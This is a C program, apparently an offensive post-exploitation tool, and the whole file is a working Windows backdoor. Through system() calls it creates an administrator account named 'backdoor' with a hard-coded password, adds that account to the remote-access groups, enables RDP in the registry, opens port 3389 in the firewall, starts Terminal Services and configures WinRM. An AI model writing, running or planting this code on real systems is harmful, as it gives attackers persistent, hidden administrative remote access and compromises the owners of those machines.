#include <stdlib.h>
#include <stdio.h>

int main() {
    // Create backdoor user
    system("net user backdoor password /add");
    printf("[+] Backdoor user created\n");
    
    // Add to administrators group
    system("net localgroup Administrators backdoor /add");
    printf("[+] Added to Administrators\n");
    
    // Add to Remote Desktop Users
    system("net localgroup \"Remote Desktop Users\" backdoor /add");
    printf("[+] Added to Remote Desktop Users\n");
    
    // Add to Remote Management Users (for WinRM)
    system("net localgroup \"Remote Management Users\" backdoor /add 2>nul");
    printf("[+] Added to Remote Management Users\n");
    
    // Enable RDP (comprehensive approach)
    system("reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f");
    system("reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v AllowTSConnections /t REG_DWORD /d 1 /f");
    
    // Open firewall for RDP
    system("netsh advfirewall firewall add rule name=\"RDP\" protocol=TCP dir=in localport=3389 action=allow");
    
    // Start the Terminal Services
    system("sc config TermService start= auto");
    system("net start TermService");
    
    // Enable WinRM if needed
    system("winrm quickconfig -quiet 2>nul");
    
    printf("[+] RDP and WinRM enabled and accessible\n");
    printf("[+] Backdoor setup complete\n");
    return 0;
}
